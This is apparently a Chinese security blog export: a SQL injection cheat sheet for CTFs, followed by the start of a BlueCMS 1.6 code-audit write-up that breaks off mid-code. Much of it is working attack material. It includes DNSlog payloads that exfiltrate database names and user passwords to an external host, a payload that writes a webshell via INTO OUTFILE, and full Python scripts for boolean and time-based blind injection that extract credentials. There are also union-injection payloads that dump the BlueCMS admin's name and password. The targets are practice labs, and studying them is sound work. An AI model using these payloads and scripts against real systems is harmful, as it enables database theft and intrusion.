datadir()举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 或者：substr((select 'password'),1,1) = 0x70strcmp(left('password',1), 0x69) = 1strcmp(left('password',1), 0x70) = 0strcmp(left('password',1), 0x71) = -1 ord 被过滤ascii preg_match 绕过数组绕过 绕过addslashes转义宽字节注入 123%DF&apos; union select 1,2,3 -- -�&apos; union select 1,2,3 -- -ï¿½&apos; union select 1,2,3 -- information_schemab.tables 被过滤替代表 12mysql.innodb_table_statstable_schema 换成 database_name 注意：MySQL5.6以上才有 sys 库 12sys.x$schema_table_statistics（只能查表名，查不到列名）表名：table_name 数据库：table_schema 12sys.schema_auto_increment_columns（可获取表名和库名）表名：table_name 数据库：table_schema 12sys.schema_table_statistics_with_buffer（可获取表名）表名：table_name 数据库：table_schema 注入语法sqllit注入123456789101112131415查找表名和列名-1&apos; union select 1,2,(select sql from sqlite_master limit 0,1),4;-1&apos; union select 1,2,(select sql from sqlite_master limit 0,1),4 -- -1&apos; union select 1,2,(select sql from sqlite_master limit 0,1),4/*聚合的方式-1&apos; union select 1,2,(select group_concat(sql) from sqlite_master),4;-1&apos; union select 1,2,(select group_concat(sql) from sqlite_master),4 -- -1&apos; union select 1,2,(select group_concat(sql) from sqlite_master),4/*查数据-1&apos; union select 1,2,(select group_concat(username,password) from users),4;-1&apos; union select 1,2,(select group_concat(username,password) from users),4 -- -1&apos; union select 1,2,(select group_concat(username,password) from users),4/* 异或注入语法判断121^1^1 // 11^0^1 // 0 猜测表名11^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))&gt;0)^1 猜测列名11^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;表名&apos;)),1,1))&gt;0)^1 猜测值11^(ord(substr((select(group_concat(列名))from(表名)),1,1))&gt;0)^1 报错注入语法1and extractvalue(1, concat(0x7e, (语句))) 1and updatexml(1, concat(0x7e, (语句), 0x7e), 1) 0x7e可代替的字符有：’~’ ‘$’ updatexml的concat可以代替的函数有：make_set update报错注入1select group_concat(password) from (select * from users)b 布尔盲注语法猜数据库名长度1and (length(database())=%d --+ 猜数据库名1and (ord(mid(database(),%d,1))=&apos;%s&apos;) --+ 猜数据库中所有表数量1and %d=(select count(table_name) from information_schema.tables where table_schema=database())--+ 猜数据库中单个表长度1and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+ 猜数据库单个表名1and (select ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)))=%d--+ 猜表中字段数量1and %d=(select count(column_name) from information_schema.columns where table_name=&apos;%s&apos; and table_schema=database())--+ 猜表中单个字段长度1and (select length(column_name) from information_schema.columns where table_name=&apos;%s&apos; and table_schema=database() limit %d ,1)=%d --+ 猜表中单个字段名1and ord(mid((select column_name from information_schema.columns where table_name=&apos;%s&apos; and table_schema=database() limit %d,1),%d,1))=%d --+ 猜表中字段名的字段值数量1and (select count(%s) from %s )=%d --+ 猜表中字段名的字段值长度1and (select length(%s) from %s limit %d,1)=%d --+ 猜表中字段名的字段值1and ord(mid((select %s from %s limit %d,1),%d,1))=%d --+ 时间盲注语法1and if(条件语句, sleep(3), 1) 时间盲注函数sleep()benchmark() 时间盲注&amp;dnslog的利用 使用DnsLog盲注仅限于windos环境 查数据库 1SELECT LOAD_FILE(CONCAT('\\\',(select database(),'mysql.cmr1ua.ceye.io\\abc'))) 1http://127.0.0.1/lou/sql/Less-9/?id=1' and load_file(concat('\\\\',(select database()),'.cmr1ua.ceye.io\\abc'))--+ 查表名 1http://127.0.0.1/lou/sql/Less-9/?id=1' and load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.cmr1ua.ceye.io\\abc'))--+ 查字段 1' and load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='users' limit 0,1),'.cmr1ua.ceye.io\\abc'))--+ 查数据 12' and load_file(concat('\\\\',(select password from users limit 0,1),'.cmr1ua.ceye.io\\abc'))--+' and load_file(concat('\\\\',(select username from users limit 0,1),'.cmr1ua.ceye.io\\abc'))--+ 注意：因为在load_file里面不能使用@ ~等符号所以要区分数据我们可以先用group_ws()函数分割在用hex()函数转成十六进制即可 出来了再转回去 1' and load_file(concat('\\\\',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.cmr1ua.ceye.io\\abc'))--+ 参考：https://www.cnblogs.com/xhds/p/12322839.html dns平台：http://ceye.io/records/dns 无列名注入（只知道表名的情况下查询数据）子查询绕过1(select `2` from (select 1,2,3 union select * from table_name)a) //前提是要知道表名 1((select c from (select 1,2,3 as c union select * from users)b)) 1，2，3是因为users表有三列，实际情况还需要猜测表的列的数量 join爆破列名1?id=-1&apos; union all select * from (select * from users as a join users as b)as c--+//as主要作用是起别名，就是把users表当做a表，常规来说as可以省略 1?id=-1&apos; union all select*from (select * from users as a join users as b using(id,username))as c--+ 逐字符检索数据这里的select 1 是对应字段的位置 比如 id username password 1 就对应id 2就对应 username 3就对应 password 123456789101112131415161718192021mysql&gt; select (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1);+------------------------------------------------------------+| (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1) |+------------------------------------------------------------+| 0 |+------------------------------------------------------------+mysql&gt; select (select 1,&apos;d&apos;) &gt; (select * from users limit 0,1);+------------------------------------------------------------+| (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1) |+------------------------------------------------------------+| 1 |+------------------------------------------------------------+//说明第二个字段的第一位是c,以此类推mysql&gt; select (select 1,&apos;cm&apos;) &gt; (select * from users limit 0,1);+------------------------------------------------------------+| (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1) |+------------------------------------------------------------+| 0 |+------------------------------------------------------------+ regexp注入order by 盲注查看表内容未完全显示的方法not in 排除的方式显示1table_name=&apos;users&apos; and table_schema=database() and column_name not in (&quot;username&quot;))))#&amp;passwd=12 left right 截断的方式显示12select(group_concat(left(password,25)))select(group_concat(right(password,25))) 正则直接匹配1test&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)&amp;&amp;(column_name)regexp(&apos;^r&apos;)),0x7e),1)# reserver逆序输出1test&quot;||updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&apos;^f&apos;))),0x7e),1)# 字符串截取函数123456left(str,index) 从左边第index开始截取right(str,index) 从右边第index开始截取substring(str,index) 从左边index开始截取mid(str,index,len) 截取str 从index开始,截取len的长度lpad(str,len,padstr) rpad(str,len,padstr) 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果ord #### sql注入getshell写入一句话1union select 1,2,&apos;一句话木马&apos; into outfile &quot;绝对路径&quot; 1union select 1,@@basedir,@@datadir 查看网站路径 读取文件1union/**/select 1,load_file(&quot;/var/www/html/flag.php&quot;),3,4 %23 特殊知识点的解决方法12$sql="SELECT username,password FROM admin WHERE username='".$username."'";if (!empty($row) &amp;&amp; $row['password']===md5($password))&#123;&#125; 1username=admin&apos; union select 1,md5(123)#&amp;password=123 二次注入的payload[网鼎杯2018]Unfinish 10&apos;+( substr(hex(hex((select * from flag ))) from (%d-1)*10+1 for 10))+&apos;0 脚本异或盲注脚本1234567891011121314151617181920212223242526272829303132import requestsurl='http://bdeb176a-4425-4fe9-997e-02afb5312134.node3.buuoj.cn/index.php'flag=''for i in range(50): a = 32 b = 128 mid = (a+b)//2 while(a&lt;b): #stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))&gt;0) 爆表名 #stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='flag')),1,1))&gt;0) 爆列名 print(mid) payload = url+"?stunum=0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))&gt;%d)"%(i,mid) import time time.sleep(1) re = requests.get(url=payload) # 首先判断目标值 是否小于 if 'admin' in re.text: a = mid + 1 else: # 目标值 大于 则直接 将 mid 赋值给 b b = mid mid = (a+b)//2 # 这个二分查找的方式是 完整的走完一遍，也就是跑7次 if (mid==32|mid==128): break flag +=chr(mid) print(flag) [网鼎杯2018]Unfinish 拿flag脚本123456789101112131415161718192021import requestslogin_url='http://bd22f3b3-0647-4006-bfca-e63aaad5a97d.node4.buuoj.cn:81/login.php'register_url='http://bd22f3b3-0647-4006-bfca-e63aaad5a97d.node4.buuoj.cn:81/register.php'content=''for i in range(1,20): data_register=&#123;'email':'15@%d'%i,'username':"0'+( substr(hex(hex((select * from flag ))) from (%d-1)*10+1 for 10))+'0"%i,'password':'1'&#125; #print(data) data_login=&#123;'email':'15@%d'%i,'password':'1'&#125; res = requests.post(register_url,data=data_register) print(res) rr=requests.post(login_url,data=data_login) rr.encoding='utf-8' r=rr.text location=r.find('user-name') cont=r[location+17:location+42].strip() content+=cont print(cont)#content=content.decode('hex').decode('hex')print(content) 自己写的脚本（用于dvwa和sqllib靶场）布尔盲注123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251import requests# 功能：基于回显的布尔盲注脚本# 适用于sqlilabs DVWA # 根据 key 的内容判断class exp_sql(object): def __init__(self, key, params=None,headers=None): # 判断回显的关键字 self.str_key = key # 头部 self.headers = headers # 参数 self.params = params def get_dbname(self, url): # 拿到当前数据库名 # payload = "' and (length(database())=8) --+" length = 1 while True: payload = "' and (length(database())=%d) --+"%(length) payload_url = url+payload # print("[*] "+payload) resp = requests.get(payload_url, headers=self.headers, params=self.params) # print(resp.text) if self.str_key in resp.text: print("[+] length: " + str(length)) db_name = self.exp_dbname(url, length) break length+=1 print("[+] 当前数据库名: " + db_name) def exp_dbname(self, url, length): # 爆破数据库名 arr_str = self.ascii_str() db_name = "" # ord 返回字符串第一个字符的 ASCII 值。 # mid 得到一个字符串的一部分 for i in range(1, length+1): for j in arr_str: payload = "' and (ord(mid(database(),%d,1))='%s')--+"%(i,ord(j)) payload_url = url + payload # print("[*] " + payload) resp = requests.get(payload_url, headers=self.headers, params=self.params) if self.str_key in resp.text: # print("[+] " + j) break db_name += j print("[*]" + db_name) return db_name def get_tables(self, url): # 拿到当前数据库所有表名数量 # ' and 4=(select count(table_name) from information_schema.tables where table_schema=database())--+ num = 0 while True: payload = "' and %d=(select count(table_name) from information_schema.tables where table_schema=database())--+"%(num) payload_url = url + payload # print("[*] " + payload_url) # print(payload) resp = requests.get(payload_url, headers=self.headers, params=self.params) # print(resp.text) if self.str_key in resp.text: print("当前数据库表总数量："+str(num)) tables = self.get_table_length(url, num) break num += 1 print("[+] 当前数据库所有表: " + str(tables)) def get_table_length(self, url, num): # 判断单个表名长度 tables = [] # ' and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+"%(i,j) for i in range(0, num): length = 1 while True: # 判断表长度 payload = "' and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+"%(i, length) payload_url = url+ payload # print("[*] " + payload) resp = requests.get(payload_url, headers=self.headers, params=self.params) if self.str_key in resp.text: print("[+] 表名长度 " + str(length)) # 由长度 猜解表名 table_name = self.get_table_name(url, i, length) print("[+] 第"+str(i+1)+ "张表名：" + table_name) tables.append(table_name) break length += 1 return tables def get_table_name(self, url, count,length): # 猜解表名 arr_str = self.ascii_str() table_name = "" # ' and (select ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)))=%d--+ for i in range(1, length+1): for s in arr_str: payload = "' and (select ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)))=%d--+"%(count, i, ord(s)) payload_url = url+ payload # print(payload) resp = requests.get(payload_url, headers=self.headers, params=self.params) if self.str_key in resp.text: # print("[*] " + s) break table_name += s print("[*] " + table_name) return table_name def get_columns(self, url, tables): # 拿到传入的表中所有字段名 table_dict = &#123;&#125; for table in tables: num = 0 while True: payload = "'and %d=(select count(column_name) from information_schema.columns where table_name='%s' and table_schema=database())--+"%(num, table) payload_url = url + payload # print(payload) resp = requests.get(payload_url, headers=self.headers, params=self.params) if self.str_key in resp.text: print('[+] 总字段数 num: ' + str(num)) columns = self.get_column_length(url, num, table) break num += 1 table_dict[table] = columns print("[+] &#123;表名: [字段名..]&#125; " + str(table_dict)) def get_column_length(self, url, num, table): # 判断单个字段长度 columns = [] # 'and (select length(column_name) from information_schema.columns where table_name='%s' limit %d ,1)=%d --+ for i in range(0, num): length = 1 while True: payload = "'and (select length(column_name) from information_schema.columns where table_name='%s' and table_schema=database() limit %d ,1)=%d --+"%(table, i, length) payload_url = url + payload resp = requests.get(payload_url, headers=self.headers, params=self.params) # print(payload) if self.str_key in resp.text: print("[+] length: " + str(length)) column_name = self.get_column_name(url, i, table, length) print("[+] " + column_name) columns.append(column_name) break length += 1 return columns def get_column_name(self, url, num, table, length): # 拿到单个字段名 str_arr = self.ascii_str() column_name = "" # 'and ord(mid((select column_name from information_schema.columns where table_name='%s' limit %d,1),%d,1))=%d--+ for i in range(1, length+1): for s in str_arr: payload = "'and ord(mid((select column_name from information_schema.columns where table_name='%s' and table_schema=database() limit %d,1),%d,1))=%d --+"%(table, num, i, ord(s)) payload_url = url + payload # print(payload) resp = requests.get(payload_url, headers=self.headers, params=self.params) if self.str_key in resp.text: # print("[+] " + s) column_name += s break print("[*] " + column_name) return column_name def get_columns_value(self, url, table, columns): # 拿到传入字段的所有字段值 column_dict = &#123;&#125; # 'and (select count('username') from users )=13 --+ for column in columns: num = 0 while True: payload = "'and (select count(%s) from %s )=%d --+"%(column, table, num) payload_url = url + payload resp = requests.get(payload_url, headers=self.headers, params=self.params) if self.str_key in resp.text: print("[+] num " + str(num)) columns_value = self.get_column_value_length(url, table, column, num) column_dict[column] = columns_value break num += 1 print("[+] &#123;字段名1: &#123;字段值1..&#125;, 字段名2: &#123;字段值1..&#125;&#125; \n" + str(column_dict)) def get_column_value_length(self, url, table, column, num): # 拿到当前传入字段值长度 columns_value = [] # 'and (select length(%s) from %s limit %d,1)=%d --+ for i in range(0, num): length = 1 while True: payload = "'and (select length(%s) from %s limit %d,1)=%d --+"%(column, table, i, length) payload_url = url + payload # print(payload) resp = requests.get(payload_url, headers=self.headers, params=self.params) if self.str_key in resp.text: # print("[+] num " + str(i) + " length " + str(length)) column_value = self.exp_column_value(url, table, column, i, length) print("[+] " + column_value) columns_value.append(column_value) break length += 1 return columns_value def exp_column_value(self, url, table, column, num, length): # 拿到单个字段值 arr_str = self.ascii_str() column_value = "" # 'and ord(mid((select count(username) from users limit 0,1) 0,1))=%s for i in range(1, length+1): for s in arr_str: payload = "'and ord(mid((select %s from %s limit %d,1),%d,1))=%d --+"%(column, table, num, i, ord(s)) payload_url = url + payload # print(payload) resp = requests.get(payload_url, headers=self.headers, params=self.params) if self.str_key in resp.text: # print("[+] " + s) column_value += s break print("[*] " + column_value) return column_value def ascii_str(self): #生成库名表名字符所在的字符列表字典 str_list=[] for i in range(33,127):#所有可显示字符 str_list.append(chr(i)) #print('可显示字符：%s'%str_list) return str_list #返回字符列表if __name__ == "__main__": # sqli less-5 s1 = exp_sql(key="You are in") # s1.get_dbname(url="http://127.0.0.1:9002/Less-5/?id=1") # s1.get_tables(url="http://127.0.0.1:9002/Less-5/?id=1") # s1.get_columns(url="http://127.0.0.1:9002/Less-5/?id=1", tables=['users']) s1.get_columns_value(url="http://127.0.0.1:9002/Less-8/?id=1", table='users', columns=['username', 'password']) # DVWA 盲注 # key = "exists" # headers = &#123;"Cookie": "sitekeyword=%26nbsp%3B; PHPSESSID=405e9e837c04dfda1cae39e51c85e316; security=low", # "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"&#125; # params = &#123;"Submit": "Submit"&#125; # s2 = exp_sql(key=key, headers=headers, params=params) # # # s2.get_dbname(url="http://127.0.0.1:9000/vulnerabilities/sqli_blind/?id=1") # # # s2.get_tables(url="http://127.0.0.1:9000/vulnerabilities/sqli_blind/?id=1") # # s2.get_columns(url="http://127.0.0.1:9000/vulnerabilities/sqli_blind/?id=1", tables=['guestbook']) # s2.get_columns_value(url="http://127.0.0.1:9000/vulnerabilities/sqli_blind/?id=1", table='users', columns=['user', 'password']) 时间盲注123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269import requestsimport datetime# 功能：基于回显的布尔盲注脚本# 适用于sqlilabs DVWA class exp_sql(object): def __init__(self, sec=3, params=None,headers=None): # 暂停秒数 低于3秒 返回结果可能不准确 self.sec = sec # 头部 self.headers = headers # 参数 self.params = params def get_dbname(self, url): # 拿到当前数据库名 # 'and if(left(database(),1)='%s' , sleep(3), 1) --+ length = 1 while True: payload = "'and if(length(database())=%d, sleep(%d), 1) --+"%(length, self.sec) payload_url = url+payload # print(payload) startTime = datetime.datetime.now() resp = requests.get(payload_url, headers=self.headers, params=self.params) endTime = datetime.datetime.now() if (endTime - startTime).seconds &gt;=self.sec: print("[+] length: " + str(length)) db_name = self.exp_dbname(url, length) break length+=1 print("[+] 当前数据库名: " + db_name) def exp_dbname(self, url, length): # 爆破数据库名 # ' and if(substr(database(), %d, 1)='%s' , sleep(3), 1) --+ arr_str = self.ascii_str() db_name = "" # ord 返回字符串第一个字符的 ASCII 值。 # mid 得到一个字符串的一部分 for i in range(1, length+1): for j in arr_str: payload = "' and if(substr(database(), %d, 1)='%s' , sleep(%d), 1) --+"%(i, j, self.sec) payload_url = url + payload # print("[*] " + payload) startTime = datetime.datetime.now() resp = requests.get(payload_url, headers=self.headers, params=self.params) endTime = datetime.datetime.now() if (endTime - startTime).seconds &gt;=self.sec: # print("[+] " + j) break db_name += j print("[*]" + db_name) return db_name def get_tables(self, url): # 拿到当前数据库所有表名 # 'and if( (select count(table_name) from information_schema.tables where table_schema=database())=%d, sleep(3), 1) --+"%(num) num = 0 while True: payload = "'and if((select count(table_name) from information_schema.tables where table_schema=database())=%d, sleep(%d), 1) --+"%(num, self.sec) payload_url = url + payload # print("[*] " + payload_url) # print(payload) startTime = datetime.datetime.now() resp = requests.get(payload_url, headers=self.headers, params=self.params) endTime = datetime.datetime.now() if (endTime - startTime).seconds &gt;=self.sec: print("当前数据库表总数量："+str(num)) tables = self.get_table_length(url, num) break num += 1 print("[+] 当前数据库所有表: " + str(tables)) def get_table_length(self, url, num): # 判断单个表名长度 tables = [] # 'and if( (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d, sleep(%d), 1) --+ for i in range(0, num): length = 1 while True: # 判断表长度 payload = "'and if( (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d, sleep(%d), 1) --+"%(i, length, self.sec) payload_url = url+ payload # print("[*] " + payload) startTime = datetime.datetime.now() resp = requests.get(payload_url, headers=self.headers, params=self.params) endTime = datetime.datetime.now() if (endTime - startTime).seconds &gt;=self.sec: print("[+] 表名长度 " + str(length)) # 由长度 猜解表名 table_name = self.get_table_name(url, i, length) print("[+] 第"+str(i+1)+ "张表名：" + table_name) tables.append(table_name) break length += 1 return tables def get_table_name(self, url, count,length): # 猜解表名 arr_str = self.ascii_str() table_name = "" # 'and if(ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1), %d,1))=%s, sleep(3), 1) --+"%(count, i, ord(s)) for i in range(1, length+1): for s in arr_str: payload = "'and if(ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1), %d,1))=%s, sleep(%d), 1) --+"%(count, i, ord(s), self.sec) payload_url = url+ payload # print(payload) startTime = datetime.datetime.now() resp = requests.get(payload_url, headers=self.headers, params=self.params) endTime = datetime.datetime.now() if (endTime - startTime).seconds &gt;=self.sec: # print("[*] " + s) table_name += s break print("[*] " + table_name) return table_name def get_columns(self, url, tables): # 拿到传入的表中所有字段名 # 'and if((select count(column_name) from information_schema.columns where table_name='%s' and table_schema=database())=%d, sleep(3), 1)--+"%(table, num) table_dict = &#123;&#125; for table in tables: num = 0 while True: payload = "'and if((select count(column_name) from information_schema.columns where table_name='%s' and table_schema=database())=%d, sleep(%d), 1)--+"%(table, num, self.sec) payload_url = url + payload # print(payload) startTime = datetime.datetime.now() resp = requests.get(payload_url, headers=self.headers, params=self.params) endTime = datetime.datetime.now() if (endTime - startTime).seconds &gt;=self.sec: print('[+] 总字段数 num: ' + str(num)) columns = self.get_column_length(url, num, table) break num += 1 table_dict[table] = columns print("[+] &#123;表名: [字段名..]&#125; " + str(table_dict)) def get_column_length(self, url, num, table): # 判断单个字段长度 columns = [] # 'and if((select length(column_name) from information_schema.columns where table_name='%s' and table_schema=database() limit %d,1)=%d , sleep(3), 1) --+"%(table, i, length) for i in range(0, num): length = 1 while True: payload = "'and if((select length(column_name) from information_schema.columns where table_name='%s' and table_schema=database() limit %d,1)=%d , sleep(%d), 1) --+"%(table, i, length, self.sec) payload_url = url + payload startTime = datetime.datetime.now() resp = requests.get(payload_url, headers=self.headers, params=self.params) endTime = datetime.datetime.now() if (endTime - startTime).seconds &gt;=self.sec: print("[+] length: " + str(length)) column_name = self.get_column_name(url, i, table, length) print("[+] " + column_name) columns.append(column_name) break length += 1 return columns def get_column_name(self, url, num, table, length): # 拿到单个字段名 str_arr = self.ascii_str() column_name = "" # 'and if(ord(mid((select column_name from information_schema.columns where table_name='%s' and table_schema=database() limit %d,1), %d,1))=%d , sleep(3), 1) --+"%(table, num, i, ord(s)) for i in range(1, length+1): for s in str_arr: payload = "'and if(ord(mid((select column_name from information_schema.columns where table_name='%s' and table_schema=database() limit %d,1), %d,1))=%d , sleep(%d), 1) --+"%(table, num, i, ord(s), self.sec) payload_url = url + payload # print(payload) startTime = datetime.datetime.now() resp = requests.get(payload_url, headers=self.headers, params=self.params) endTime = datetime.datetime.now() if (endTime - startTime).seconds &gt;=self.sec: # print("[+] " + s) column_name += s break print("[*] " + column_name) return column_name def get_columns_value(self, url, table, columns): # 拿到传入字段的所有字段值 column_dict = &#123;&#125; # 'and if((select count(%s) from %s)=%d, sleep(3), 1) --+"%(column, table, num) for column in columns: num = 0 while True: payload = "'and if((select count(%s) from %s)=%d, sleep(%d), 1) --+"%(column, table, num, self.sec) payload_url = url + payload startTime = datetime.datetime.now() resp = requests.get(payload_url, headers=self.headers, params=self.params) endTime = datetime.datetime.now() if (endTime - startTime).seconds &gt;=self.sec: print("[+] num " + str(num)) columns_value = self.get_column_value_length(url, table, column, num) column_dict[column] = columns_value break num += 1 print("[+] &#123;字段名1: &#123;字段值1..&#125;, 字段名2: &#123;字段值1..&#125;&#125; \n" + str(column_dict)) def get_column_value_length(self, url, table, column, num): # 拿到当前传入字段值长度 columns_value = [] # 'and (select length(%s) from %s limit %d,1)=%d --+ for i in range(0, num): length = 1 while True: payload = "'and if((select length(%s) from %s limit %d,1)=%d, sleep(%d), 1) --+"%(column, table, i, length, self.sec) payload_url = url + payload # print(payload) startTime = datetime.datetime.now() resp = requests.get(payload_url, headers=self.headers, params=self.params) endTime = datetime.datetime.now() if (endTime - startTime).seconds &gt;=self.sec: # print("[+] num " + str(i) + " length " + str(length)) column_value = self.exp_column_value(url, table, column, i, length) print("[+] " + column_value) columns_value.append(column_value) break length += 1 return columns_value def exp_column_value(self, url, table, column, num, length): # 拿到单个字段值 arr_str = self.ascii_str() column_value = "" # 'and if(ord(mid((select %s from %s limit %d,1), %d,1))=%d, sleep(3), 1) --+"%(column, table, num, i, ord(s)) for i in range(1, length+1): for s in arr_str: payload = "'and if(ord(mid((select %s from %s limit %d,1), %d,1))=%d, sleep(%d), 1) --+"%(column, table, num, i, ord(s), self.sec) payload_url = url + payload # print(payload) startTime = datetime.datetime.now() resp = requests.get(payload_url, headers=self.headers, params=self.params) endTime = datetime.datetime.now() if (endTime - startTime).seconds &gt;=self.sec: # print("[+] " + s) column_value += s break print("[*] " + column_value) return column_value def ascii_str(self): #生成库名表名字符所在的字符列表字典 str_list=[] for i in range(33,127):#所有可显示字符 str_list.append(chr(i)) #print('可显示字符：%s'%str_list) return str_list #返回字符列表if __name__ == "__main__": # sqli less-5 # s1 = exp_sql() # s1.get_dbname(url="http://127.0.0.1:9002/Less-9/?id=1") # s1.get_tables(url="http://127.0.0.1:9002/Less-9/?id=1") # s1.get_columns(url="http://127.0.0.1:9002/Less-9/?id=1", tables=['users']) # s1.get_columns_value(url="http://127.0.0.1:9002/Less-9/?id=1", table='users', columns=['username', 'password']) # DVWA 盲注 headers = &#123;"Cookie": "sitekeyword=%26nbsp%3B; PHPSESSID=dee9efccd127ae9b659726416910bbaf; security=low", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"&#125; params = &#123;"Submit": "Submit"&#125; # s2 = exp_sql(headers=headers, params=params) # s2.get_dbname(url="http://127.0.0.1:9000/vulnerabilities/sqli_blind/?id=1") # s2.get_tables(url="http://127.0.0.1:9000/vulnerabilities/sqli_blind/?id=1") # # s2.get_columns(url="http://127.0.0.1:9000/vulnerabilities/sqli_blind/?id=1", tables=['guestbook']) # s2.get_columns_value(url="http://127.0.0.1:9000/vulnerabilities/sqli_blind/?id=1", table='users', columns=['user', 'password'])]]></content>
      <categories>
        <category>CTF</category>
        <category>CTF做题姿势总结</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PHP代码审计】记录对bluecms1.6sp1进行代码审计]]></title>
    <url>%2F2021%2F11%2F15%2F%5BPHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%E8%AE%B0%E5%BD%95%E5%AF%B9bluecms1.6sp1%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[前言 在看代码审计企业级Web代码安全架构这本书的电子版，找了个案例来进行审计，大佬们推荐bluecms v1.6 sp1这套源码来审计，在本地搭建环境，用这篇文章做记录。 如何入手？在本地搭建好环境后，用phpstorm打开这套网站的文件夹，看到一堆php文件和文件夹，一下子不知如何下手？ 书上提供了四种代码审计的思路 根据敏感关键字回溯参数传递过程 查找可控变量，正向追踪变量传递过程 寻找敏感功能点，通读功能点代码 直接通读全文代码 作为一个新手，当然是选择一个比较容易地方式入手啦，直接打开Seay源代码审计系统自动审计一遍。 扫出255个可疑漏洞 看到这么多可疑点，确实是又让人有些头秃，先不管这么多，先从第一个开始审计。 SQL注入-联合注入路径 /uploads/ad_js.php 在19行出发现一条sql语句，其ad_id的值直接进行了拼接，接下来看看$ad_id的值是如何来的。 在12行处发现$ad_id变量的值通过$_GET[‘ad_id’]拿到，并且也没有经过过滤，那么这里肯定存在sql注入漏洞，接下来进行测试。 1234ad_js.php?ad_id= 1 order by 8 //报错ad_js.php?ad_id= 1 order by 7 // 正常 ad_js.php?ad_id=%201%20union%20select%201,2,3,4,5,6,7// 回显了7 1ad_js.php?ad_id=%201%20union%20select%201,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database() 1ad_js.php?ad_id=%201%20union%20select%201,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_name=&apos;blue_admin&apos; 这里报错，我传入的单引号被转义成\&#39;了。为什么会被转义呢？我确实没有看明白，待会在分析，这里很容易绕过，直接使用表名的十六进制0x626c75655f61646d696e。 成功绕过 1ad_js.php?ad_id=%201%20union%20select%201,2,3,4,5,6,group_concat(admin_name,pwd) from blue_admin 成功拿到管理员的用户名密码。 第一个漏洞审计起来并没有那么复杂，稍微有些基础都能够利用。刚刚有一个问题并没有解决，就是在GET参数获取的时候并没有过滤和加addslashes()函数，为什么给我传入的单引号进行了转义了呢？ 经过分析 在10行引入了一个文件 进入/include/common.inc.php 发现 对所有的GET、POST、COOKIES、REQUEST都执行了deep_addslashes函数。 而这个deep_addslashes函数的功能则是对上面这几个变量传入的值进行特殊字符转义 到这就明白了刚刚为什么会被转义，审计出来的第一个联合注入漏洞。 接下来继续 /upload/ann.php 在33行发现$cid变量进行了拼接，来到$cid拿到值的地方。 可以得知，这里用了intval对拿到的值进行了整数转换，也就意味着我们无法传入sql语句，导致不可利用。 下一个 时间盲注&amp;dnslog的利用/uploads/comment.php 在这个文件中找到如下几处执行sql语句的代码 从代码中可以看到，都是直接拼接了变量，所有的sql语句都拼接了$id这个变量，接下来回溯到$id拿到值的地方。 也将拿到的值进行了整数转换。也就是后面的两条sql都无法利用，不过，我在第三天插入语句里看到了一个函数getip()，接下来跳过去看看。 12345678910111213141516171819202122232425262728function getip()&#123; if (getenv('HTTP_CLIENT_IP')) &#123; $ip = getenv('HTTP_CLIENT_IP'); &#125; elseif (getenv('HTTP_X_FORWARDED_FOR')) &#123; //获取客户端用代理服务器访问时的真实ip 地址 $ip = getenv('HTTP_X_FORWARDED_FOR'); &#125; elseif (getenv('HTTP_X_FORWARDED')) &#123; $ip = getenv('HTTP_X_FORWARDED'); &#125; elseif (getenv('HTTP_FORWARDED_FOR')) &#123; $ip = getenv('HTTP_FORWARDED_FOR'); &#125; elseif (getenv('HTTP_FORWARDED')) &#123; $ip = 